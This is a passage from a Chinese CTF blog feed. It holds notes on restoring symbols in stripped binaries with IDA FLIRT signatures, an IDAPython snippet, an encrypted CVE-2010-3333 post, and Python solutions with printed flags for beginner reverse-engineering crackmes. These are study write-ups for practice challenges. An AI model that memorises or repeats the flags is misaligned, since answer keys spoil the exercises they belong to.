class="string">'C'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'p'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'o'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'e'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'d'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'f'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'e'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'`'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'_'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'U'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'T'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'b'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'a'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'m'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'l'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'l'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'k'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'f'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'e'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'s'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'r'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'t'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'s'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Code_Talkers</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/c8f4b23e/">https://noone-hub.github.io/posts/c8f4b23e/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>恢复静态编译去符号</title>
    <url>/posts/fea8bac7/</url>
    <content><![CDATA[<h1 id="ida-pro恢复去符号程序的符号"><a href="#ida-pro恢复去符号程序的符号" class="headerlink" title="ida pro恢复去符号程序的符号"></a>ida pro恢复去符号程序的符号</h1><h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>第一部分说的都是废话吧，对我来说，建议用后面部分的</p><h2 id="恢复方法"><a href="#恢复方法" class="headerlink" title="恢复方法"></a>恢复方法</h2><h3 id="lscanf"><a href="#lscanf" class="headerlink" title="lscanf"></a>lscanf</h3><p>首先获得sig,我这里用的是lscanf里的sig</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hcm91ZW5lYm91YmFrcmkvbHNjYW4=" title="https://github.com/maroueneboubakri/lscan">下载地址<i class="fa fa-external-link"></i></span></p><p>先扫描下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python lscan.py -f stripped -S amd64/sig/</span><br><span class="line">amd64/sig/libc-2.13.sig 12266/3369 (364.08%)</span><br><span class="line">amd64/sig/libc-2.22.sig 12870/2859 (450.16%)</span><br><span class="line">amd64/sig/libc-2.23.sig 13163/2869 (458.80%)</span><br><span class="line">amd64/sig/libcrypto-1.0.2h.sig 36850/5057 (728.69%)</span><br><span class="line">amd64/sig/libm-2.13.sig 11125/445 (2500.00%)</span><br><span class="line">amd64/sig/libm-2.22.sig 11121/582 (1910.82%)</span><br><span class="line">amd64/sig/libm-2.23.sig 11124/600 (1854.00%)</span><br><span class="line">amd64/sig/libpcre-8.38.sig 18/150 (12.00%)</span><br><span class="line">amd64/sig/libpthread-2.13.sig 11379/319 (3567.08%)</span><br><span class="line">amd64/sig/libpthread-2.22.sig 11159/262 (4259.16%)</span><br><span class="line">amd64/sig/libpthread-2.23.sig 11160/258 (4325.58%)</span><br><span class="line">amd64/sig/libssl-1.0.2h.sig 0/665 (0.00%)</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>对比下符号哪个版本最匹配，这里显示是libm-2.13是最高的</p><p>到目录下移动libm-2.13.sig到IDA pro的安装目录下的sig文件夹下的pc目录下(大坑，网上都说是sig目录下，放到那完全没用,对我来说)</p><p>emm，这个lscan 有点坑，我跑起来会卡死我机子，算了删了，手动尝试吧，下个sig database</p><h3 id="sig-database"><a href="#sig-database" class="headerlink" title="sig-database"></a>sig-database</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B1c2gwZWJwL3NpZy1kYXRhYmFzZQ==" title="https://github.com/push0ebp/sig-database">sig-database<i class="fa fa-external-link"></i></span></p><p>file-&gt;Load file-&gt;flirt signature file</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117205629.png" alt></p><p>或者shift+f5<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117205744.png" alt></p><h3 id="重要的事情"><a href="#重要的事情" class="headerlink" title="重要的事情"></a>重要的事情</h3><p><strong>将.sig移动到IDA pro的安装目录下的sig文件夹下的pc目录下(大坑，网上都说是sig目录下，放到那完全没用,对我来说)</strong><br><strong>将.sig移动到IDA pro的安装目录下的sig文件夹下的pc目录下(大坑，网上都说是sig目录下，放到那完全没用,对我来说)</strong><br><strong>将.sig移动到IDA pro的安装目录下的sig文件夹下的pc目录下(大坑，网上都说是sig目录下，放到那完全没用,对我来说)</strong></p><h2 id="红帽杯-2019-three"><a href="#红帽杯-2019-three" class="headerlink" title="红帽杯 2019 three"></a>红帽杯 2019 three</h2><p>这道题也是去除了符号表的</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117220250.png" alt></p><p>经尝试好多次后，发觉这个最符合，<br>libc6_2.27-0ubuntu2_i386 Applied 460 ubuntu 18.04 libc6 (2.27-0ubuntu2/i386)</p><p>看下恢复符号后</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117220354.png" alt></p><p>恢复符号前</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117220453.png" alt></p><p>好明显的对比，太强了</p><h2 id="湖湘杯-HackNote"><a href="#湖湘杯-HackNote" class="headerlink" title="湖湘杯 HackNote"></a>湖湘杯 HackNote</h2><p>这个最匹配的库</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117220901.png" alt></p><p>libc6_2.23-0ubuntu10_amd64 Applied 671 ubuntu 16.04 libc6 (2.23-0ubuntu10/amd64)</p><p>多么好看的场景</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117221018.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>静态去符号的题目最近做了好几道，总结下这种方法，避免以后再次遇到</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/fea8bac7/">https://noone-hub.github.io/posts/fea8bac7/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
  </entry>
  <entry>
    <title>idapython</title>
    <url>/posts/7abfd35a/</url>
    <content><![CDATA[<h1 id="idapython-学习"><a href="#idapython-学习" class="headerlink" title="idapython 学习"></a>idapython 学习</h1><p>第一个idapython脚本取数据</p><table><thead><tr><th>代码</th><th>备注</th></tr></thead><tbody><tr><td>idc.NextHead</td><td>获得下一条指令首地址</td></tr><tr><td>idc.PreHead</td><td>获得上一条指令首地址</td></tr><tr><td>GetOpnd</td><td>获得mov esi,1 mov后面的</td></tr><tr><td>GetMnem</td><td>获得mov esi,1 mov</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getList</span><span class="params">(start,end)</span>:</span></span><br><span class="line">    List = []</span><br><span class="line">    <span class="keyword">while</span> start &lt;= end:</span><br><span class="line">        next = idc.NextHead(start) <span class="comment">#取下一条指令</span></span><br><span class="line">        result = int(GetOpnd(start,<span class="number">1</span>)[:<span class="number">-1</span>],<span class="number">16</span>) <span class="comment"># 取mov esi,1的1</span></span><br><span class="line">        <span class="comment"># GetMnem(0x4007e1) 取mov esi,1 的mov</span></span><br><span class="line">        List.append(result)</span><br><span class="line">        start = next</span><br><span class="line">    <span class="keyword">return</span> List</span><br><span class="line"></span><br><span class="line">print(getList(<span class="number">0x4007e1</span>, <span class="number">0x400851</span>))</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/7abfd35a/">https://noone-hub.github.io/posts/7abfd35a/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
  </entry>
  <entry>
    <title>cve-2010-3333</title>
    <url>/posts/d527976b/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="1bb74d4933961c1bb0447ffc0db9e71db1e2e38a3c52ee7ff83de1a28037c987">88297ae6ef5b1754b8d7392e09a2f26d29286dc3451e61d131e26e413c31f0e9263e9af48b4bf001c234b3dbb60bd048d6e40749e4fe58e6fb61e031717bccd4326c8bfa9e9fb127e0591a89eed63181d59d14a970357bf0f7347541cf398b8778d14e10584d206ad9ecbf180f72c944929247575d05cd762c4dfc6d2a6db1457e68196fc4789e4fe988f2a1c0581c5b6737944c05111b483b5a7337c775f0f0cd3b930f8e69c650b6a30991ed9b16ec6dcc72043f1cd6e1556a54591838e2e1f79a514edf8983594b889bfcb2c011ca7a0dd0d588dc40c335771dc6808d338cce7bc83ce7be34e906c37047917990696f21f48c617b9fb7e561d8eb39a1fbf2daea6adeee5fb518bea992cf4e5d1a01707b882ac24c66ae8a8dc3d017d3a021ced36c0d69697e2c58b1c219687ebb12c7f26b41c017a920af7523cbda45d65cc73d907d5d23e933de18f35e7f51563025eee4fb3663887c1e687c16f866c17a5f35afa7d4d4da729c1ac4a5c4252c42b73113bf419f9d95e0e11884070abe178015cde4e253b8729eb22e540241eddc5f1f5281496be6255f46f6ed9ddd26aa3d7cdb3657ace87c2d7d78494b20387cd741a3bd8b49d23bb153f4bc7ad6ffb7bc95d76bd58eaf59ea270b4b804584e0d1a6154f9b597baf8eec4e5da75de05f036332b0ffabe71037261981f9e5ad325b3a6d80d2c036eba06a19dab5866858f51f2aa7a33539937f6bf96c0bd4260e1024c3747cad7a9ba2d76bd72adda1d27c047d1a7f237fbeea0fd7d1a1167b3988ea9c382d46bcc61de5bb9f7bd606d6a585b685b432b7dd07ee4fe3cd0d54bb68e2fdef3c4857f392bdac5d4de8403cbc6b462dc25d556269ab018f1e186d0f1842fbbea01f6360a47b4b07b27e2b51fd100282c7f9ba1b9a9dc771c97e3b6486197b47aeea72ebdc8bdb678883bae5e08467f7f31207def906ddef79e4e33384e715e319b8d39707efa7e2a05e564931d5b1e99a0d950a10874f7e772faffe54af4e4739625fe64acb98d995650ed1c029e8e143dbc277e39fb23476b470834098e9b70e43f0671c67fee7afc103b629fe55054d865799bc6bac1b79e3fbccb663d0d50c5e329efc4f1af702c82ffb5fc4123a66ac797be95d4c4fe28eee1c7d459dd43720ed38be9bb900e2beeebeb772a74844bce313fd9c061fcff22a9ed88569e43c7d5cd92a196c94abf67de8544525353e7eb6c798b76ebd4da58bec</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>实战</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界新手区re</title>
    <url>/posts/ff286fcb/</url>
    <content><![CDATA[<h1 id="re题目新手区练习"><a href="#re题目新手区练习" class="headerlink" title="re题目新手区练习"></a>re题目新手区练习</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>od打开字符串搜一下。<br>DUTCTF{We1c0met0DUTCTF}</p><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>随便乱输一下<br>zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}</p><p>emm，实质就是比较灯。这里没有算法，直接全nop就行了</p><h2 id="re3"><a href="#re3" class="headerlink" title="re3"></a>re3</h2><p>将输入的转为16进制与已知16进制串对比</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">string = <span class="string">"437261636b4d654a757374466f7246756e"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(string), <span class="number">2</span>):</span><br><span class="line">    flag += chr(int(string[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#CrackMeJustForFun</span></span><br></pre></td></tr></table></figure><h2 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h2><ol><li>第一段输入0xcafe</li><li>第二段为就是8</li><li>第三段为h4cky0u</li><li>第四段 first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207;</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0xcafe</span></span><br><span class="line"><span class="number">51966</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">8</span>*<span class="number">25</span></span><br><span class="line"><span class="number">200</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">51966</span>*<span class="number">31337</span> + <span class="number">8</span>*<span class="number">11</span> + <span class="number">7</span> - <span class="number">1615810207</span></span><br><span class="line"><span class="number">12648430</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">12648430</span>)</span><br><span class="line"><span class="string">'0xc0ffee'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>第一次带了0x没提交上。。</p><h2 id="re5"><a href="#re5" class="headerlink" title="re5"></a>re5</h2><p>upx -d 脱掉壳就拿到flag了。。</p><p>flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny}</p><h2 id="re6"><a href="#re6" class="headerlink" title="re6"></a>re6</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(<span class="string">':\"AL_RT^L*.?+6/46'</span>)</span><br><span class="line"><span class="number">17</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">v7 = hex(<span class="number">0x65626D61726168</span>)[<span class="number">2</span>:]</span><br><span class="line">v7 = [int(v7[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(v7), <span class="number">2</span>) ][::<span class="number">-1</span>]</span><br><span class="line">string = <span class="string">':\"AL_RT^L*.?+6/46'</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">    first = v7[i % <span class="number">7</span>]</span><br><span class="line">    second = ord(string[i]) ^ first</span><br><span class="line">    flag += chr(second)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># RC3-2016-XORISGUD</span></span><br></pre></td></tr></table></figure><p>坑点，小端序列，我转成int后忘了倒序，一直是错的。。</p><h2 id="re7"><a href="#re7" class="headerlink" title="re7"></a>re7</h2><p>???<br>9447{This_is_a_flag}</p><h2 id="re8"><a href="#re8" class="headerlink" title="re8"></a>re8</h2><p>python写个算法跑一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">List1 = [<span class="number">0x3A</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x37</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x71</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x78</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x73</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x67</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x62</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x73</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6B</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x71</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x78</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x73</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x78</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7B</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x76</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x78</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x73</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7B</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">List2 = [<span class="number">0x01</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">v6 = len(List1)</span><br><span class="line">v4 = <span class="number">0</span></span><br><span class="line">v7 = len(List2)</span><br><span class="line"><span class="keyword">while</span>(v4 &lt; v6):</span><br><span class="line">    List1[v4] -= List2[v4%v7]</span><br><span class="line">    v4 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">List1 = [i <span class="keyword">for</span> i <span class="keyword">in</span> List1 <span class="keyword">if</span> i!= <span class="number">0</span>][:<span class="number">-2</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> List1:</span><br><span class="line">    flag += chr(i)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">9</span><br><span class="line">94</span><br><span class="line">944</span><br><span class="line">9447</span><br><span class="line">9447&#123;</span><br><span class="line">9447&#123;y</span><br><span class="line">9447&#123;yo</span><br><span class="line">9447&#123;you</span><br><span class="line">9447&#123;you_</span><br><span class="line">9447&#123;you_a</span><br><span class="line">9447&#123;you_ar</span><br><span class="line">9447&#123;you_are</span><br><span class="line">9447&#123;you_are_</span><br><span class="line">9447&#123;you_are_a</span><br><span class="line">9447&#123;you_are_an</span><br><span class="line">9447&#123;you_are_an_</span><br><span class="line">9447&#123;you_are_an_i</span><br><span class="line">9447&#123;you_are_an_in</span><br><span class="line">9447&#123;you_are_an_int</span><br><span class="line">9447&#123;you_are_an_inte</span><br><span class="line">9447&#123;you_are_an_inter</span><br><span class="line">9447&#123;you_are_an_intern</span><br><span class="line">9447&#123;you_are_an_interna</span><br><span class="line">9447&#123;you_are_an_internat</span><br><span class="line">9447&#123;you_are_an_internati</span><br><span class="line">9447&#123;you_are_an_internatio</span><br><span class="line">9447&#123;you_are_an_internation</span><br><span class="line">9447&#123;you_are_an_internationa</span><br><span class="line">9447&#123;you_are_an_international</span><br><span class="line">9447&#123;you_are_an_international_</span><br><span class="line">9447&#123;you_are_an_international_m</span><br><span class="line">9447&#123;you_are_an_international_my</span><br><span class="line">9447&#123;you_are_an_international_mys</span><br><span class="line">9447&#123;you_are_an_international_myst</span><br><span class="line">9447&#123;you_are_an_international_myste</span><br><span class="line">9447&#123;you_are_an_international_myster</span><br><span class="line">9447&#123;you_are_an_international_mystery</span><br><span class="line">9447&#123;you_are_an_international_mystery&#125;</span><br></pre></td></tr></table></figure><h2 id="re9"><a href="#re9" class="headerlink" title="re9"></a>re9</h2><p>看下算法，跑下就行了，还是小端序问题</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">List1 =[<span class="number">0xBCA0CCBB</span>, <span class="number">0xB8BED1DC</span>, <span class="number">0xAEBECFCD</span>, <span class="number">0x82ABC4D2</span>, <span class="number">0xB393D9D2</span>, <span class="number">0xA993DED4</span>, <span class="number">0x82B8CBD3</span>, <span class="number">0xB9BECBD3</span>, <span class="number">0x00CCD79A</span>]</span><br><span class="line">v2 = <span class="number">0xDDCCAABB</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(List1)):</span><br><span class="line">    result = hex( List1[i] ^ v2 )[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        temp = int(result[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">        flag += chr(temp)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#flag += chr(result)</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="re10"><a href="#re10" class="headerlink" title="re10"></a>re10</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">string = <span class="string">"c61b68366edeb7bdce3c6820314b7498"</span></span><br><span class="line">flag =<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">    v3 = <span class="number">1</span> <span class="keyword">if</span> i&amp;<span class="number">1</span> <span class="keyword">else</span> <span class="number">-1</span></span><br><span class="line">    result = ord(string[i])+v3</span><br><span class="line">    flag += chr(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># S</span></span><br><span class="line">flag0 = <span class="string">"SharifCTF&#123;"</span></span><br><span class="line">flag1 = <span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line">flag = flag0 + flag + flag1</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>好坑的一道题。。少了个S，我还以为我做错了</p><h2 id="re11"><a href="#re11" class="headerlink" title="re11"></a>re11</h2><p><span class="exturl" data-url="aHR0cHM6Ly90b29sLmx1L3B5Yy8=" title="https://tool.lu/pyc/">pyc反编译<i class="fa fa-external-link"></i></span></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="comment"># 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = ord(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Input flag:'</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'correct'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wrong'</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">correct = base64.b64decode(correct)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(message)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x= ord(i) - <span class="number">16</span></span><br><span class="line">        x = x ^ <span class="number">32</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">flag = decode(correct)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#nctf&#123;d3c0mpil1n9_PyC&#125;</span></span><br></pre></td></tr></table></figure><h2 id="re12"><a href="#re12" class="headerlink" title="re12"></a>re12</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">control = <span class="string">'''</span></span><br><span class="line"><span class="string">O -1 左</span></span><br><span class="line"><span class="string">o +1 右</span></span><br><span class="line"><span class="string">. -1 上</span></span><br><span class="line"><span class="string">0 +1 下</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> (control)</span><br><span class="line"></span><br><span class="line">maze = <span class="string">'  *******   *  **** * ****  * ***  *#  *** *** ***     *********'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    print(maze[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>])</span><br><span 